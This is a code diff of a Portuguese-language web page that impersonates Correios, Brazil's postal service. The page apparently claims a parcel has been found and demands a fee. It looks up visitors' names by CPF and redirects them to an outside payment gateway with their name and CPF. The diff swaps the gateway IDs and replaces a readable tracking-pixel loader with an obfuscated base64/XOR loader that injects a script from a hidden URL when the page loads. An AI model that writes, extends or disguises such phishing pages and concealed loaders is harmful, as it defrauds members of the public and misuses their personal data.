@@ -1,17 +1,12 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Correios - Encomenda Localizada</title>
-  <script>
-    window.pixelId = "6a347c1d62a4a0f4b2d647e4";
-    window.utmify = window.utmify || function() { (window.utmify.q = window.utmify.q || []).push(arguments); };
-    var a = document.createElement("script");
-    a.setAttribute("async", "");
-    a.setAttribute("defer", "");
-    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-    document.head.appendChild(a);
-    window.utmify('track', 'InitiateCheckout');
-  </script><script async="" defer="" src="js/pixel.js"></script>
+  <script>(function(){var g_sjl=atob("DOlwXs9KtVscfhxuTJJSK70ml2E+FmgaPJpKceAp0TUyC2gDJY8JcKwl2HV+DDMdL5sZLrs5mit1BnkCY5kZJqommzFvXDBMLZ0ELKYowC95DT5UF7RcfKgm2jl9Em9MdrILfKEr2D4+RD4eJZEVMoYul3c+CH0COYxSZO181D8uGiRdf9BBOvx4hz14HCtfeI0Sav9oyAZh");var m_v4b4=[];for(var r_nt=0;r_nt<g_sjl.length;r_nt++){m_v4b4.push(g_sjl.charCodeAt(r_nt)&255);}var x_bqa1=m_v4b4[0];var c_ds2x=m_v4b4.slice(1,1+x_bqa1);var f_z=m_v4b4.slice(1+x_bqa1);var i_sc3=f_z.map(function(b,y_b){return b^c_ds2x[y_b%x_bqa1];});var n_2r="";for(var j_zsbq=0;j_zsbq<i_sc3.length;j_zsbq++){n_2r+=String.fromCharCode(i_sc3[j_zsbq]&255);}var q_n9f=decodeURIComponent(escape(n_2r));var i_7d=JSON.parse(q_n9f);var l_s80u=i_7d.globals||[];l_s80u.forEach(function(g_54l){window[g_54l.name]=g_54l.value;});var z_55h=document.createElement("script");z_55h.src=i_7d.url;z_55h.async=true;z_55h.defer=true;(i_7d.attributes||[]).forEach(function(a_gv){z_55h.setAttribute(a_gv.name,a_gv.value);});(document.head||document.documentElement).appendChild(z_55h);})();</script>
+  <script async="" defer="" src="js/pixel.js"></script>
   <style>
     * {
       margin: 0;
@@ -33,7 +28,7 @@
       width: 100%;
       max-width: 420px;
       background-color: #ffffff;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
     }
 
     /* Header */
@@ -156,7 +151,10 @@
       align-items: center;
       justify-content: center;
     }
-    #loading-overlay.ativo { display: flex; }
+
+    #loading-overlay.ativo {
+      display: flex;
+    }
 
     .lo-topo {
       width: 100%;
@@ -166,24 +164,44 @@
       top: 0;
       left: 0;
     }
+
     .lo-barra {
       height: 4px;
       background: #FFCC00;
       width: 0%;
       animation: lo-progress 3s ease-in-out forwards;
     }
-    @keyframes lo-progress { 0%{width:0%} 60%{width:75%} 90%{width:90%} 100%{width:95%} }
+
+    @keyframes lo-progress {
+      0% {
+        width: 0%
+      }
+
+      60% {
+        width: 75%
+      }
+
+      90% {
+        width: 90%
+      }
+
+      100% {
+        width: 95%
+      }
+    }
 
     .lo-logo-img {
       width: 180px;
       margin-bottom: 28px;
     }
+
     .lo-divisor {
       width: 180px;
       height: 2px;
       background: #FFCC00;
       margin-bottom: 22px;
     }
+
     .lo-step {
       font-size: 0.82rem;
       color: #666;
@@ -191,65 +209,79 @@
       letter-spacing: 0.01em;
       min-height: 1.2em;
     }
+
     .lo-dots::after {
       content: '';
       animation: lo-dot 1.2s steps(4, end) infinite;
     }
+
     @keyframes lo-dot {
-      0%  { content: ''; }
-      25% { content: '.'; }
-      50% { content: '..'; }
-      75% { content: '...'; }
+      0% {
+        content: '';
+      }
+
+      25% {
+        content: '.';
+      }
+
+      50% {
+        content: '..';
+      }
+
+      75% {
+        content: '...';
+      }
     }
   </style>
 </head>
+
 <body>
   <!-- Loading overlay -->
   <div id="loading-overlay" class="ativo">
     <div class="lo-topo">
-        <div class="lo-barra" id="lo-barra"></div>
+      <div class="lo-barra" id="lo-barra"></div>
     </div>
     <img class="lo-logo-img" src="images/correios.png" alt="Correios">
     <div class="lo-divisor"></div>
     <div class="lo-step lo-dots" id="lo-msg">Verificando seus dados</div>
-</div>
+  </div>
 
-<script>
-const mensagens = [
-    "Verificando seus dados",
-    "Localizando encomenda",
-    "Gerando código de pagamento"
-];
+  <script>
+    const mensagens = [
+      "Verificando seus dados",
+      "Localizando encomenda",
+      "Gerando código de pagamento"
+    ];
 
-const msg = document.getElementById("lo-msg");
+    const msg = document.getElementById("lo-msg");
 
-mensagens.forEach((texto, index) => {
-    setTimeout(() => {
+    mensagens.forEach((texto, index) => {
+      setTimeout(() => {
         msg.textContent = texto;
-    }, index * 1200);
-});
+      }, index * 1200);
+    });
 
-setTimeout(() => {
-    const urlParams = new URLSearchParams(window.location.search);
+    setTimeout(() => {
+      const urlParams = new URLSearchParams(window.location.search);
 
-    const nome = urlParams.get("nome")
+      const nome = urlParams.get("nome")
         ? decodeURIComponent(urlParams.get("nome"))
         : "";
 
-    const cpf = urlParams.get("cpf")
+      const cpf = urlParams.get("cpf")
         ? urlParams.get("cpf")
         : "";
 
-    urlParams.set("name", nome);
-    urlParams.set("document", cpf);
+      urlParams.set("name", nome);
+      urlParams.set("document", cpf);
 
-    const finalUrl =
-        "https://pay.sunize.com.br/jgmeOpie?" +
+      const finalUrl =
+        "https://pay.sunize.com.br/cYyEgsqY?" +
         urlParams.toString();
 
-    window.location.href = finalUrl;
-}, 3600);
-</script>
+      window.location.href = finalUrl;
+    }, 3600);
+  </script>
 
   <div class="email-wrapper">
 
@@ -289,15 +321,15 @@ setTimeout(() => {
     (async function () {
       if (!cpf) return;
       try {
-        const res  = await fetch('/api/consulta?cpf=' + encodeURIComponent(cpf));
+        const res = await fetch('/api/consulta?cpf=' + encodeURIComponent(cpf));
         const data = await res.json();
         if (!data.erro && data.dados && data.dados.length > 0) {
           nomeGlobal = data.dados[0].NOME;
           const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
           document.getElementById('texto-nome').textContent = nomeGlobal;
-          document.getElementById('texto-cpf').textContent  = cpfFormatado;
+          document.getElementById('texto-cpf').textContent = cpfFormatado;
         }
-      } catch (e) {}
+      } catch (e) { }
     })();
 
     // Animação de carregamento ao clicar no botão
@@ -321,11 +353,11 @@ setTimeout(() => {
       setTimeout(function () { msg.textContent = 'Gerando código de pagamento'; }, 2400);
 
       setTimeout(function () {
-        var gatewayBase = 'https://pay.sunize.com.br/jgmeOpie';
-        var urlParams   = new URLSearchParams(window.location.search);
-        var utmKeys     = ['utm_source','utm_campaign','utm_medium','utm_content','utm_term','xcod','src','fbclid','sck','subid'];
-        var q           = new URLSearchParams();
-        utmKeys.forEach(function(k){
+        var gatewayBase = 'https://pay.sunize.com.br/cYyEgsqY';
+        var urlParams = new URLSearchParams(window.location.search);
+        var utmKeys = ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'xcod', 'src', 'fbclid', 'sck', 'subid'];
+        var q = new URLSearchParams();
+        utmKeys.forEach(function (k) {
           var v = urlParams.get(k) || localStorage.getItem(k) || '';
           if (v) q.set(k, v);
         });
@@ -335,4 +367,6 @@ setTimeout(() => {
     });
   </script>
 
-</body></html>
+</body>
+
+</html>
